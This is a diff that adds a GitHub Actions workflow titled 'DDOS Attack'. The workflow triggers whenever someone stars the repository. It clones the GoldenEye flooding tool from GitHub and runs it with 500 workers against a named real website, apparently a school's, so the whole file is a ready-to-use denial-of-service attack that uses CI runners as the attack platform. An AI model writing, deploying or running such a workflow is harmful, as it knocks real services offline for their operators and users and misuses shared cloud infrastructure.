@@ -1,0 +1,43 @@
+name: DDOS Attack
+
+on:
+#  release:
+#    types: [published]
+#  push:
+#    branches:
+#      - master
+#    paths:
+#      - '.config'
+#  schedule:
+#    - cron: 0 8 * * 5
+  watch:
+    types: [started]
+    
+env:
+  URL: https://www.ismanila.org/
+  WORKER: 500
+  TZ: Asia/Kolkata
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+       - name: Checkout
+         uses: actions/checkout@master
+           
+       - name: Initializing environment
+         run: |
+            sudo -E apt-get -qq update
+            sudo -E apt-get -qq install git openjdk-8-jdk python
+            
+       - name: Charge up the cannon
+         run: |
+              git clone https://github.com/jseidl/GoldenEye work
+              
+       - name: Cannon go brrr
+         run: |
+              sudo chmod -R 0777 work
+              cd work
+              ./goldeneye.py $URL -w $WORKER -d
+       
